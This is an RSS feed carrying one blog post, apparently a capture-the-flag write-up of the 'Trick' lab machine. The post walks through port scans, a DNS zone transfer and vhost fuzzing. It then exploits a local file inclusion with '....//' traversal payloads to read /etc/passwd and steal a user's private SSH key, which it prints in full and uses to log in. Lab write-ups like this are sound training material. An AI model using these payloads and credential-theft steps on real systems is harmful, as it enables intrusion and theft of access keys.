<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Posts on MØst Xeon</title>
        <link>https://mostxeon.github.io/posts/</link>
        <description>Recent content in Posts on MØst Xeon</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>en-us</language>
        <lastBuildDate>Fri, 28 Oct 2022 13:44:37 +0300</lastBuildDate>
        <atom:link href="https://mostxeon.github.io/posts/index.xml" rel="self" type="application/rss+xml" />
        
        <item>
            <title>Trick</title>
            <link>https://mostxeon.github.io/posts/trick/</link>
            <pubDate>Fri, 28 Oct 2022 13:44:37 +0300</pubDate>
            
            <guid>https://mostxeon.github.io/posts/trick/</guid>
            <description>false</description>
            <content type="html"><![CDATA[<h2 id="initial-recon">Initial Recon</h2>
<h3 id="nmap">Nmap</h3>
<p>Starting with a basic tcp scan for the top 1000 ports using nmap, I got the below results:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nmap -p- -A 10.10.11.166
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Starting Nmap 7.93 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-10-28 13:47 EEST
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> trick.htb <span style="color:#f92672">(</span>10.10.11.166<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.15s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">65531</span> closed tcp ports <span style="color:#f92672">(</span>conn-refused<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>PORT   STATE SERVICE VERSION
</span></span><span style="display:flex;"><span>22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 <span style="color:#f92672">(</span>protocol 2.0<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| ssh-hostkey: 
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">2048</span> 61ff293b36bd9dacfbde1f56884cae2d <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|   <span style="color:#ae81ff">256</span> 9ecdf2406196ea21a6ce2602af759a78 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>|_  <span style="color:#ae81ff">256</span> 7293f91158de34ad12b54b4a7364b970 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>25/tcp open  smtp    Postfix smtpd
</span></span><span style="display:flex;"><span>|_smtp-commands: debian.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
</span></span><span style="display:flex;"><span>53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u7 <span style="color:#f92672">(</span>Debian Linux<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| dns-nsid: 
</span></span><span style="display:flex;"><span>|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian
</span></span><span style="display:flex;"><span>80/tcp open  http    nginx 1.14.2
</span></span><span style="display:flex;"><span>|_http-title: Coming Soon - Start Bootstrap Theme
</span></span><span style="display:flex;"><span>|_http-server-header: nginx/1.14.2
</span></span><span style="display:flex;"><span>Service Info: Host:  debian.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 527.64 seconds
</span></span></code></pre></div><p>Few ports are open including (22,25,53,80) and I can see that port 53 running a dns server is open. Usually dns services operate on udp ports I&rsquo;ll also scan top 1000 udp ports on this machine.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ sudo nmap -A -sU 10.10.11.166
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Starting Nmap 7.93 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-10-28 14:00 EEST
</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> trick.htb <span style="color:#f92672">(</span>10.10.11.166<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.099s latency<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">996</span> closed udp ports <span style="color:#f92672">(</span>port-unreach<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>PORT     STATE         SERVICE  VERSION
</span></span><span style="display:flex;"><span>53/udp   open          domain   ISC BIND 9.11.5-P4-5.1+deb10u7 <span style="color:#f92672">(</span>Debian Linux<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>| dns-nsid: 
</span></span><span style="display:flex;"><span>|_  bind.version: 9.11.5-P4-5.1+deb10u7-Debian
</span></span><span style="display:flex;"><span>68/udp   open|filtered dhcpc
</span></span><span style="display:flex;"><span>631/udp  open|filtered ipp
</span></span><span style="display:flex;"><span>5353/udp open|filtered zeroconf
</span></span><span style="display:flex;"><span>Device type: remote management|webcam|phone|general purpose|storage-misc
</span></span><span style="display:flex;"><span>Running: Avocent embedded, AXIS embedded, Google Android 2.X, Linux 2.6.X|3.X, ZyXEL embedded
</span></span><span style="display:flex;"><span>OS CPE: cpe:/h:axis:207w_network_camera cpe:/o:google:android:2.2 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:2.6.17 cpe:/o:linux:linux_kernel:3.8 cpe:/h:zyxel:nsa-210
</span></span><span style="display:flex;"><span>Too many fingerprints match this host to give specific OS details
</span></span><span style="display:flex;"><span>Network Distance: <span style="color:#ae81ff">2</span> hops
</span></span><span style="display:flex;"><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>TRACEROUTE <span style="color:#f92672">(</span>using port 49194/udp<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>HOP RTT       ADDRESS
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">1</span>   139.39 ms 10.10.16.1
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">2</span>   73.82 ms  10.10.11.166
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 1231.47 seconds
</span></span></code></pre></div><h3 id="interacting-with-services">Interacting With Services</h3>
<h4 id="port-80-tcp">Port 80 (TCP)</h4>
<p>Navigating to the web server on port 80, I didn&rsquo;t find anything of interest.</p>
<p><img src="main_page_port80.png" alt="Main Page Port 80"></p>
<p>It&rsquo;s a single static page with no useful information.</p>
<h4 id="port-53-udptcp">Port 53 (UDP/TCP)</h4>
<p>I&rsquo;ll try first to look for <a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-dns#zone-transfer"><em>Zone Transfer</em></a> if enabled in order to get more information about the target since I don&rsquo;t even know its domain name.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ dig axfr @10.10.11.166
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>; &lt;&lt;&gt;&gt; DiG 9.18.7-1-Debian &lt;&lt;&gt;&gt; axfr @10.10.11.166
</span></span><span style="display:flex;"><span>; <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> server found<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>;; global options: +cmd
</span></span><span style="display:flex;"><span>;; Query time: <span style="color:#ae81ff">84</span> msec
</span></span><span style="display:flex;"><span>;; SERVER: 10.10.11.166#53<span style="color:#f92672">(</span>10.10.11.166<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>UDP<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>;; WHEN: Fri Oct <span style="color:#ae81ff">28</span> 14:13:16 EEST <span style="color:#ae81ff">2022</span>
</span></span><span style="display:flex;"><span>;; MSG SIZE  rcvd: <span style="color:#ae81ff">56</span>
</span></span></code></pre></div><p>Howerver I didn&rsquo;t get anything useful, I&rsquo;ll try now by guessing the domain from the machine&rsquo;s name <em>trick.htb</em>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ dig axfr @10.10.11.166 trick.htb
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>; &lt;&lt;&gt;&gt; DiG 9.18.7-1-Debian &lt;&lt;&gt;&gt; axfr @10.10.11.166 trick.htb
</span></span><span style="display:flex;"><span>; <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> server found<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>;; global options: +cmd
</span></span><span style="display:flex;"><span>trick.htb.		604800	IN	SOA	trick.htb. root.trick.htb. <span style="color:#ae81ff">5</span> <span style="color:#ae81ff">604800</span> <span style="color:#ae81ff">86400</span> <span style="color:#ae81ff">2419200</span> <span style="color:#ae81ff">604800</span>
</span></span><span style="display:flex;"><span>trick.htb.		604800	IN	NS	trick.htb.
</span></span><span style="display:flex;"><span>trick.htb.		604800	IN	A	127.0.0.1
</span></span><span style="display:flex;"><span>trick.htb.		604800	IN	AAAA	::1
</span></span><span style="display:flex;"><span>preprod-payroll.trick.htb. <span style="color:#ae81ff">604800</span> IN	CNAME	trick.htb.
</span></span><span style="display:flex;"><span>trick.htb.		604800	IN	SOA	trick.htb. root.trick.htb. <span style="color:#ae81ff">5</span> <span style="color:#ae81ff">604800</span> <span style="color:#ae81ff">86400</span> <span style="color:#ae81ff">2419200</span> <span style="color:#ae81ff">604800</span>
</span></span><span style="display:flex;"><span>;; Query time: <span style="color:#ae81ff">240</span> msec
</span></span><span style="display:flex;"><span>;; SERVER: 10.10.11.166#53<span style="color:#f92672">(</span>10.10.11.166<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>TCP<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>;; WHEN: Fri Oct <span style="color:#ae81ff">28</span> 14:21:21 EEST <span style="color:#ae81ff">2022</span>
</span></span><span style="display:flex;"><span>;; XFR size: <span style="color:#ae81ff">6</span> records <span style="color:#f92672">(</span>messages 1, bytes 231<span style="color:#f92672">)</span>
</span></span></code></pre></div><p>From the results above, I can see that <em>trick.htb</em> is a valid domain name, it also discloses a new domain <em>preprod-payroll.trick.htb</em>, so I&rsquo;ll add these to my <em>/etc/hosts</em> file.</p>
<h2 id="enumerating-web-server">Enumerating Web Server</h2>
<h3 id="vhost-enumeration">VHOST Enumeration</h3>
<p>After some simple directory bruteforcing on <em>preprod-payroll.trick.htb</em>, I came to a dead end. The only thing I found was a login page and a <em>database</em> directory giving me a 403 forbidden, and I wasn&rsquo;t able to find any files there with the simple wordlists I use.</p>
<p>So I had to enumerate <em>vhosts</em> looking for some hidden domains. Again using a simple wordlist from <a href="https://github.com/danielmiessler/SecLists"><em>seclists</em></a> called <a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/subdomains-top1million-5000.txt"><em>subdomains-top1million-5000.txt</em></a> I wasn&rsquo;t able to find anything, however this time I had a clue about the manner they name their domain, it seems that they append the prefix <em>preprod-</em> to thier domain, so why not doing the same and bruteforce vhosts again using this prefix.</p>
<ul>
<li>
<p>Enumerating vhosts using <a href="https://github.com/OJ/gobuster"><em>Gobuster</em></a>:</p>
<ul>
<li>I can create a new wordlist from <a href="https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/subdomains-top1million-5000.txt"><em>subdomains-top1million-5000.txt</em></a> by appending <em>preprod-</em> to each line using sed: <code>sed 's/^/preprod-/' /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt &gt; new_custom_wordlist.txt</code></li>
<li>Then use vhost flag with gobuster <code>gobuster vhost -w new_custom_wordlist.txt -u trick.htb --append-domain</code></li>
</ul>
</li>
<li>
<p>Enumerating vhosts using <a href="https://github.com/ffuf/ffuf"><em>Ffuf</em></a>:</p>
<ul>
<li>Here I don&rsquo;t need to create a new wordlist, but I do need to filter requests on the size because the server responds with <em>200 response code</em> on any random subdomain, so the only way to know if the subdomain is valid is by getting a different content length: <code>ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://trick.htb/ -H 'Host: preprod-FUZZ.trick.htb' -fs 5480</code></li>
<li><em>Note</em>: This is the same technique that <em>gobuster vhost</em> flag uses.</li>
</ul>
</li>
</ul>
<p>I got a valid domain <em>preprod-marketing.trick.htb</em> so I&rsquo;ll add it to my <em>/etc/hosts</em> file.</p>
<p>Navigating to this new domain, I can clearly see that it is a new website:</p>
<p><img src="preprod-marketing.trick.htb-main-page.png" alt="preprod-marketing.trick.htb Main Page"></p>
<h3 id="exploiting-lfi">Exploiting LFI</h3>
<p>Navigating to one of the present tabs, I noticed <em>?page=services.html</em> GET parameter, which might indicate a possible <a href="https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion"><em>LFI vulnerability</em></a>.</p>
<p>Again, I&rsquo;ll use <a href="https://github.com/ffuf/ffuf"><em>Ffuf</em></a> to fuzz this parameter using <em>LFI</em> payloads from <a href="https://github.com/danielmiessler/SecLists"><em>seclists</em></a>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u http://preprod-marketing.trick.htb/index.php?page<span style="color:#f92672">=</span>FUZZ -fs <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        /<span style="color:#e6db74">&#39;___\  /&#39;</span>___<span style="color:#ae81ff">\ </span>          /<span style="color:#960050;background-color:#1e0010">&#39;</span>___<span style="color:#ae81ff">\ </span>      
</span></span><span style="display:flex;"><span>       /<span style="color:#ae81ff">\ \_</span>_/ /<span style="color:#ae81ff">\ \_</span>_/  __  __  /<span style="color:#ae81ff">\ \_</span>_/       
</span></span><span style="display:flex;"><span>       <span style="color:#ae81ff">\ \ </span>,__<span style="color:#ae81ff">\\</span> <span style="color:#ae81ff">\ </span>,__<span style="color:#ae81ff">\/\ \/\ \ \ \ </span>,__<span style="color:#ae81ff">\ </span>     
</span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">\ \ \_</span>/ <span style="color:#ae81ff">\ \ \_</span>/<span style="color:#ae81ff">\ \ \_\ \ \ \ \_</span>/      
</span></span><span style="display:flex;"><span>         <span style="color:#ae81ff">\ \_\ </span>  <span style="color:#ae81ff">\ \_\ </span> <span style="color:#ae81ff">\ \_</span>___/  <span style="color:#ae81ff">\ \_\ </span>      
</span></span><span style="display:flex;"><span>          <span style="color:#ae81ff">\/</span>_/    <span style="color:#ae81ff">\/</span>_/   <span style="color:#ae81ff">\/</span>___/    <span style="color:#ae81ff">\/</span>_/       
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>       v1.5.0 Kali Exclusive &lt;<span style="color:#ae81ff">3</span>
</span></span><span style="display:flex;"><span>________________________________________________
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span> :: Method           : GET
</span></span><span style="display:flex;"><span> :: URL              : http://preprod-marketing.trick.htb/index.php?page<span style="color:#f92672">=</span>FUZZ
</span></span><span style="display:flex;"><span> :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
</span></span><span style="display:flex;"><span> :: Follow redirects : false
</span></span><span style="display:flex;"><span> :: Calibration      : false
</span></span><span style="display:flex;"><span> :: Timeout          : <span style="color:#ae81ff">10</span>
</span></span><span style="display:flex;"><span> :: Threads          : <span style="color:#ae81ff">40</span>
</span></span><span style="display:flex;"><span> :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
</span></span><span style="display:flex;"><span> :: Filter           : Response size: <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>________________________________________________
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd <span style="color:#f92672">[</span>Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 153ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd <span style="color:#f92672">[</span>Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 225ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd <span style="color:#f92672">[</span>Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 86ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd <span style="color:#f92672">[</span>Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 85ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd <span style="color:#f92672">[</span>Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 85ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd <span style="color:#f92672">[</span>Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 96ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd <span style="color:#f92672">[</span>Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 97ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd <span style="color:#f92672">[</span>Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 98ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd <span style="color:#f92672">[</span>Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 98ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>....//....//....//....//....//....//....//....//....//....//etc/passwd <span style="color:#f92672">[</span>Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 88ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd <span style="color:#f92672">[</span>Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 99ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>....//....//....//....//....//....//....//....//....//....//....//etc/passwd <span style="color:#f92672">[</span>Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 90ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>....//....//....//....//....//....//etc/passwd <span style="color:#f92672">[</span>Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 90ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>....//....//....//....//....//etc/passwd <span style="color:#f92672">[</span>Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 91ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd <span style="color:#f92672">[</span>Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 93ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>....//....//....//....//....//....//....//....//....//etc/passwd <span style="color:#f92672">[</span>Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 94ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>....//....//....//etc/passwd <span style="color:#f92672">[</span>Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 100ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>....//....//....//....//....//....//....//....//etc/passwd <span style="color:#f92672">[</span>Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 105ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>....//....//....//....//etc/passwd <span style="color:#f92672">[</span>Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 119ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>....//....//....//....//....//....//....//etc/passwd <span style="color:#f92672">[</span>Status: 200, Size: 2351, Words: 28, Lines: 42, Duration: 122ms<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>:: Progress: <span style="color:#f92672">[</span>920/920<span style="color:#f92672">]</span> :: Job <span style="color:#f92672">[</span>1/1<span style="color:#f92672">]</span> :: <span style="color:#ae81ff">416</span> req/sec :: Duration: <span style="color:#f92672">[</span>0:00:02<span style="color:#f92672">]</span> :: Errors: <span style="color:#ae81ff">0</span> ::
</span></span></code></pre></div><p>And I got several hits with a payload like <code>....//....//....//....//....//....//....//etc/passwd</code>, so now I&rsquo;ll use curl to read local files from this server.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ curl http://preprod-marketing.trick.htb/index.php?page<span style="color:#f92672">=</span>....//....//....//....//....//....//....//etc/passwd
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>root:x:0:0:root:/root:/bin/bash
</span></span><span style="display:flex;"><span>...
</span></span><span style="display:flex;"><span>michael:x:1001:1001::/home/michael:/bin/bash
</span></span></code></pre></div><h2 id="getting-user">Getting User</h2>
<p>From <em>/etc/passwd</em> I can see that <em>michael</em> is a user on this machine, so I&rsquo;ll try to read his <em>private SSH key</em> which will usually be present in <em>/home/[username]/.ssh/id_rsa</em>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ curl http://preprod-marketing.trick.htb/index.php?page<span style="color:#f92672">=</span>....//....//....//....//....//....//....//home/michael/.ssh/id_rsa
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>-----BEGIN OPENSSH PRIVATE KEY-----
</span></span><span style="display:flex;"><span>b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
</span></span><span style="display:flex;"><span>NhAAAAAwEAAQAAAQEAwI9YLFRKT6JFTSqPt2/+7mgg5HpSwzHZwu95Nqh1Gu4+9P+ohLtz
</span></span><span style="display:flex;"><span>c4jtky6wYGzlxKHg/Q5ehozs9TgNWPVKh+j92WdCNPvdzaQqYKxw4Fwd3K7F4JsnZaJk2G
</span></span><span style="display:flex;"><span>YQ2re/gTrNElMAqURSCVydx/UvGCNT9dwQ4zna4sxIZF4HpwRt1T74wioqIX3EAYCCZcf+
</span></span><span style="display:flex;"><span>4gAYBhUQTYeJlYpDVfbbRH2yD73x7NcICp5iIYrdS455nARJtPHYkO9eobmyamyNDgAia/
</span></span><span style="display:flex;"><span>Ukn75SroKGUMdiJHnd+m1jW5mGotQRxkATWMY5qFOiKglnws/jgdxpDV9K3iDTPWXFwtK4
</span></span><span style="display:flex;"><span>1kC+t4a8sQAAA8hzFJk2cxSZNgAAAAdzc2gtcnNhAAABAQDAj1gsVEpPokVNKo+3b/7uaC
</span></span><span style="display:flex;"><span>DkelLDMdnC73k2qHUa7j70/6iEu3NziO2TLrBgbOXEoeD9Dl6GjOz1OA1Y9UqH6P3ZZ0I0
</span></span><span style="display:flex;"><span>+93NpCpgrHDgXB3crsXgmydlomTYZhDat7+BOs0SUwCpRFIJXJ3H9S8YI1P13BDjOdrizE
</span></span><span style="display:flex;"><span>hkXgenBG3VPvjCKiohfcQBgIJlx/7iABgGFRBNh4mVikNV9ttEfbIPvfHs1wgKnmIhit1L
</span></span><span style="display:flex;"><span>jnmcBEm08diQ716hubJqbI0OACJr9SSfvlKugoZQx2Iked36bWNbmYai1BHGQBNYxjmoU6
</span></span><span style="display:flex;"><span>IqCWfCz+OB3GkNX0reINM9ZcXC0rjWQL63hryxAAAAAwEAAQAAAQASAVVNT9Ri/dldDc3C
</span></span><span style="display:flex;"><span>aUZ9JF9u/cEfX1ntUFcVNUs96WkZn44yWxTAiN0uFf+IBKa3bCuNffp4ulSt2T/mQYlmi/
</span></span><span style="display:flex;"><span>KwkWcvbR2gTOlpgLZNRE/GgtEd32QfrL+hPGn3CZdujgD+5aP6L9k75t0aBWMR7ru7EYjC
</span></span><span style="display:flex;"><span>tnYxHsjmGaS9iRLpo79lwmIDHpu2fSdVpphAmsaYtVFPSwf01VlEZvIEWAEY6qv7r455Ge
</span></span><span style="display:flex;"><span>U+38O714987fRe4+jcfSpCTFB0fQkNArHCKiHRjYFCWVCBWuYkVlGYXLVlUcYVezS+ouM0
</span></span><span style="display:flex;"><span>fHbE5GMyJf6+/8P06MbAdZ1+5nWRmdtLOFKF1rpHh43BAAAAgQDJ6xWCdmx5DGsHmkhG1V
</span></span><span style="display:flex;"><span>PH+7+Oono2E7cgBv7GIqpdxRsozETjqzDlMYGnhk9oCG8v8oiXUVlM0e4jUOmnqaCvdDTS
</span></span><span style="display:flex;"><span>3AZ4FVonhCl5DFVPEz4UdlKgHS0LZoJuz4yq2YEt5DcSixuS+Nr3aFUTl3SxOxD7T4tKXA
</span></span><span style="display:flex;"><span>fvjlQQh81veQAAAIEA6UE9xt6D4YXwFmjKo+5KQpasJquMVrLcxKyAlNpLNxYN8LzGS0sT
</span></span><span style="display:flex;"><span>AuNHUSgX/tcNxg1yYHeHTu868/LUTe8l3Sb268YaOnxEbmkPQbBscDerqEAPOvwHD9rrgn
</span></span><span style="display:flex;"><span>In16n3kMFSFaU2bCkzaLGQ+hoD5QJXeVMt6a/5ztUWQZCJXkcAAACBANNWO6MfEDxYr9DP
</span></span><span style="display:flex;"><span>JkCbANS5fRVNVi0Lx+BSFyEKs2ThJqvlhnxBs43QxBX0j4BkqFUfuJ/YzySvfVNPtSb0XN
</span></span><span style="display:flex;"><span>jsj51hLkyTIOBEVxNjDcPWOj5470u21X8qx2F3M4+YGGH+mka7P+VVfvJDZa67XNHzrxi+
</span></span><span style="display:flex;"><span>IJhaN0D5bVMdjjFHAAAADW1pY2hhZWxAdHJpY2sBAgMEBQ<span style="color:#f92672">==</span>
</span></span><span style="display:flex;"><span>-----END OPENSSH PRIVATE KEY-----
</span></span></code></pre></div><p>And it worked, so now I&rsquo;ll be able to <em>SSH</em> into the server as user <em>michael</em>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ curl -s http://preprod-marketing.trick.htb/index.php?page<span style="color:#f92672">=</span>....//....//....//....//....//....//....//home/michael/.ssh/id_rsa &gt; michael_id_rsa
</span></span><span style="display:flex;"><span>$ chmod <span style="color:#ae81ff">600</span> michael_id_rsa
</span></span><span style="display:flex;"><span>$ ssh -i michael_id_rsa michael@trick.htb
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Linux trick 4.19.0-20-amd64 <span style="color:#75715e">#1 SMP Debian 4.19.235-1 (2022-03-17) x86_64</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>The programs included with the Debian GNU/Linux system are free software;
</span></span><span style="display:flex;"><span>the exact distribution terms <span style="color:#66d9ef">for</span> each program are described in the
</span></span><span style="display:flex;"><span>individual files in /usr/share/doc/*/copyright.
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
</span></span><span style="display:flex;"><span>permitted by applicable law.
</span></span><span style="display:flex;"><span>Last login: Fri Oct <span style="color:#ae81ff">28</span> 17:15:31 <span style="color:#ae81ff">2022</span> from 10.10.14.105
</span></span><span style="display:flex;"><span>michael@trick:~$ id
</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>michael<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>michael<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>michael<span style="color:#f92672">)</span>,1002<span style="color:#f92672">(</span>security<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>michael@trick:~$ cat user.txt
</span></span><span style="display:flex;"><span>043**************************bda
</span></span></code></pre></div><h2 id="post-enumeration">Post Enumeration</h2>
